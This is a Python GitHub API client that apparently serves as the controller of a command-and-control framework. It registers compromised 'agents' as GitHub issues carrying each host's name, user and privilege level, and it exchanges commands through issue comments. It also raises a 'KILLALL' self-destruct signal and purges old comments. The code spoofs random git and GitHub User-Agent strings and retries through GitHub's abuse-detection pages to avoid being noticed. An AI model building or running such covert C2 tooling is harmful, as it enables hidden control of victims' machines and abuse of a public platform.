"""
GitHub API client — mirrors cli-controller/src/github.rs.
Includes retry logic with Retry-After handling for 429.
"""
import email.utils
import random
import time
from datetime import datetime, timedelta, timezone

import requests


def _parse_retry_after(value: str) -> int:
    """Parse Retry-After header: integer seconds or HTTP-date string."""
    try:
        return max(1, int(value))
    except (ValueError, TypeError):
        pass
    try:
        dt = email.utils.parsedate_to_datetime(value)
        secs = int((dt - datetime.now(timezone.utc)).total_seconds())
        return max(1, secs)
    except Exception:
        return 60


def _ua() -> str:
    return random.choice([
        f"git/2.{random.randint(30, 45)}.{random.randint(0, 9)}",
        "go-github/60.0.0",
        "GitHub-Actions-Hookshot/1.0",
    ])


class GitHubClient:
    BASE = "https://api.github.com"

    def __init__(self, token: str, repo: str):
        self.token      = token
        self.repo       = repo
        self._last_error = ""
        self._s         = requests.Session()
        self._s.headers.update({
            "Authorization":        f"token {token}",
            "Accept":               "application/vnd.github+json",
            "X-GitHub-Api-Version": "2022-11-28",
        })

    # ── Low-level helpers ──────────────────────────────────────────────────────

    def _request(self, method: str, url: str, **kw):
        """Retry up to 3 times with backoff; honour Retry-After on 429.
        A 403 whose body is an HTML interstitial page (GitHub abuse-detection
        blip) is retried like a server error — observed intermittently in the
        real-environment lab on otherwise valid fine-grained tokens.
        Sets self._last_error on failure so callers can report the root cause."""
        self._last_error = ""
        delay = 2
        for attempt in range(4):
            try:
                kw.setdefault("timeout", 15)
                kw.setdefault("headers", {})["User-Agent"] = _ua()
                r = self._s.request(method, url, **kw)
                if r.status_code == 429:
                    wait = _parse_retry_after(r.headers.get("Retry-After", "60"))
                    self._last_error = f"HTTP 429 rate-limited (Retry-After {wait}s)"
                    if attempt < 3:
                        time.sleep(min(wait, 60))
                        continue
                    return None
                if r.status_code == 403 and attempt < 3:
                    body = r.text[:400]
                    low = body.lower()
                    retryable = (
                        body.lstrip().startswith("<")
                        or "rate limit" in low
                        or "secondary rate" in low
                        or r.headers.get("X-RateLimit-Remaining") == "0"
                    )
                    if retryable:
                        self._last_error = f"HTTP 403 rate-limit/interstitial (retryable): {body[:120]}"
                        wait = _parse_retry_after(r.headers.get("Retry-After", str(delay)))
                        time.sleep(min(max(wait, delay), 60))
                        delay *= 2
                        continue
                if r.status_code >= 500 and attempt < 3:
                    self._last_error = f"HTTP {r.status_code} server error"
                    time.sleep(delay)
                    delay *= 2
                    continue
                return r
            except Exception as exc:
                self._last_error = f"{type(exc).__name__}: {exc}"
                if attempt < 3:
                    time.sleep(delay)
                    delay *= 2
        return None

    def _get(self, path: str, **params):
        return self._request("GET", f"{self.BASE}/{path}", params=params or None)

    def _post(self, path: str, body: dict):
        return self._request("POST", f"{self.BASE}/{path}", json=body)

    def _patch(self, path: str, body: dict):
        return self._request("PATCH", f"{self.BASE}/{path}", json=body)

    def _delete(self, path: str):
        return self._request("DELETE", f"{self.BASE}/{path}")

    # ── Agents ────────────────────────────────────────────────────────────────

    def get_agents(self) -> list[dict]:
        agents, page = [], 1
        MAX_PAGES = 20  # 20 * 100 = 2000 agents max
        while page <= MAX_PAGES:
            r = self._get(
                f"repos/{self.repo}/issues",
                labels="agent", state="open", per_page=100, page=page,
            )
            if not r or not r.ok:
                break
            issues = r.json()
            if not isinstance(issues, list):
                break
            for iss in issues:
                a = self._parse_agent(iss)
                if a:
                    agents.append(a)
            if len(issues) < 100:
                break
            page += 1
        return agents

    @staticmethod
    def _parse_agent(issue: dict) -> dict | None:
        body = issue.get("body") or ""
        uuid = None
        for line in body.splitlines():
            if line.startswith("Agent ID:"):
                uuid = line[9:].strip()
                break
        if not uuid:
            return None

        info = {
            "id":         str(issue["number"]),
            "agent_uuid": uuid,
            "repo":       "",   # filled by caller
            "last_seen":  issue.get("updated_at", ""),
            "hostname":   "unknown",
            "os":         "unknown",
            "username":   "unknown",
            "privilege":  "unknown",
            "kernel":     "",
            "arch":       "",
            "version":    "",
            "release_id": "",
        }
        for line in body.splitlines():
            t = line.strip()
            for prefix, field in [
                ("Host:",      "hostname"),
                ("Hostname:",  "hostname"),
                ("User:",      "username"),
                ("OS:",        "os"),
                ("Privilege:", "privilege"),
                ("Kernel:",    "kernel"),
                ("Arch:",      "arch"),
                ("Version:",   "version"),
                ("Release:",   "release_id"),
            ]:
                if t.startswith(prefix) and info.get(field) in ("unknown", "", None):
                    info[field] = t[len(prefix):].strip()
        # Fallback: if privilege wasn't found in body, default to "user"
        if info["privilege"] == "unknown":
            info["privilege"] = "user"
        return info

    # ── Comments ──────────────────────────────────────────────────────────────

    def get_comments(self, issue_id: str, since: str | None = None) -> list[dict]:
        comments, page = [], 1
        MAX_PAGES = 50  # 50 * 100 = 5 000 comments max; prevents runaway on huge issues
        while page <= MAX_PAGES:
            kw = dict(per_page=100, page=page)
            if since:
                kw["since"] = since
            r = self._get(f"repos/{self.repo}/issues/{issue_id}/comments", **kw)
            if not r or not r.ok:
                break
            batch = r.json()
            if not isinstance(batch, list):
                break
            comments.extend(batch)
            if len(batch) < 100:
                break
            page += 1
        return comments

    def post_comment(self, issue_id: str, body: str) -> tuple[bool, str]:
        """Post a comment. Returns (ok, error_detail). error_detail is '' on success."""
        r = self._post(f"repos/{self.repo}/issues/{issue_id}/comments", {"body": body})
        if r is None:
            reason = self._last_error or "no response after retries"
            return False, f"network/SSL error: {reason}"
        if r.ok:
            return True, ""
        try:
            msg = r.json().get("message", r.text[:200])
        except Exception:
            msg = r.text[:200]
        return False, f"HTTP {r.status_code}: {msg}"

    def list_open_kill_signals(self) -> list:
        """Open KILLALL issues with their numbers and creation times, so the
        controller can auto-close ones that have outlived their TTL."""
        r = self._get(f"repos/{self.repo}/issues",
                      labels="KILLALL", state="open", per_page=50)
        if not r or not r.ok:
            return []
        try:
            issues = r.json()
        except ValueError:
            return []
        return [{"number": i.get("number"), "created_at": i.get("created_at", "")}
                for i in issues if isinstance(i, dict)]

    def delete_comment(self, comment_id: int) -> bool:
        r = self._delete(f"repos/{self.repo}/issues/comments/{comment_id}")
        return bool(r and (r.ok or r.status_code == 204))

    def clear_comments(self, issue_id: str):
        for c in self.get_comments(issue_id):
            self.delete_comment(c["id"])

    # ── Issue management ──────────────────────────────────────────────────────

    def close_issue(self, issue_number: int) -> bool:
        r = self._patch(f"repos/{self.repo}/issues/{issue_number}", {"state": "closed"})
        return bool(r and r.ok)

    def list_agent_issues(self) -> list[dict]:
        issues, page = [], 1
        while True:
            r = self._get(
                f"repos/{self.repo}/issues",
                labels="agent", state="open", per_page=100, page=page,
            )
            if not r or not r.ok:
                break
            for iss in r.json():
                body = iss.get("body") or ""
                uuid = next(
                    (l[9:].strip() for l in body.splitlines() if l.startswith("Agent ID:")),
                    "",
                )
                issues.append({
                    "number":     iss["number"],
                    "uuid":       uuid,
                    "updated_at": iss.get("updated_at", ""),
                    "title":      iss.get("title", ""),
                })
            if len(r.json()) < 100:
                break
            page += 1
        return issues

    def create_kill_signal(self) -> bool:
        """Create an issue with label KILLALL — agents poll for this and self-destruct."""
        r = self._post(f"repos/{self.repo}/issues", {
            "title": "KILLALL",
            "body": "Emergency kill signal — all agents will self-destruct upon detection.",
            "labels": ["KILLALL"],
        })
        return bool(r and r.status_code in (200, 201))

    def remove_kill_signal(self) -> int:
        """Close all KILLALL issues (deactivate kill switch). Returns count closed."""
        r = self._get(f"repos/{self.repo}/issues", labels="KILLALL", state="open", per_page=100)
        if not r or not r.ok:
            return 0
        closed = 0
        for iss in r.json():
            if self.close_issue(iss["number"]):
                closed += 1
        return closed

    def auto_cleanup(self, limit: int, stale_days: int = 0) -> tuple[int, int, list[str]]:
        """Delete old comments across all agent issues when total exceeds limit.

Age guard: only comments older than max(24h, stale_days*24h) are physically
deleted, so unread responses (UI idle → polling paused) are never destroyed.

        For each open agent issue:
          - Count all comments
          - If count > limit: delete the oldest (count - limit) comments, keep newest `limit`
          - Issue itself is never closed (issue = agent identity)

        Returns (total_deleted, total_comments_scanned, detail_strings).
        """
        issues = self.list_agent_issues()
        total_deleted = 0
        total_scanned = 0
        details = []

        for iss in issues:
            issue_id = str(iss["number"])
            comments = self.get_comments(issue_id)
            total_scanned += len(comments)

            if len(comments) <= limit:
                continue

            # Sort by id ascending (oldest first) — GitHub comment IDs are monotonic
            comments.sort(key=lambda c: c["id"])
            excess = len(comments) - limit
            to_delete = comments[:excess]   # oldest N comments

            # C8 保底：只物理删除"龄 > MIN_AGE_HOURS"的超限评论。
            # UI 空闲时后台轮询暂停，未读响应还躺在信道里——无龄限的按量裁剪
            # 会把没读走的响应直接删掉（不可恢复）。24h 足够任何活跃 agent 轮询消费。
            from datetime import datetime, timedelta, timezone
            _FMT = ("%Y-%m-%dT%H:%M:%SZ", "%Y-%m-%dT%H:%M:%S%z")
            def _age_hours(c) -> float:
                ts = str(c.get("created_at") or "")
                dt = None
                for f in _FMT:
                    try:
                        dt = datetime.strptime(ts, f); break
                    except ValueError:
                        continue
                if dt is None:
                    return 0.0            # 无时间戳 → 视为极老，允许删
                if dt.tzinfo is None:
                    dt = dt.replace(tzinfo=timezone.utc)
                return (datetime.now(timezone.utc) - dt).total_seconds() / 3600
            min_age = max(24, (stale_days or 0) * 24)
            to_delete = [c for c in to_delete if _age_hours(c) >= min_age]

            deleted_count = 0
            for c in to_delete:
                try:
                    if self.delete_comment(c["id"]):
                        deleted_count += 1
                    time.sleep(0.2)   # avoid GitHub rate limit
                except Exception:
                    pass

            if deleted_count > 0:
                uid = iss["uuid"][:8] if iss["uuid"] else "?"
                details.append(f"#{issue_id}[{uid}]: {deleted_count} comments deleted")
                total_deleted += deleted_count

        return total_deleted, total_scanned, details
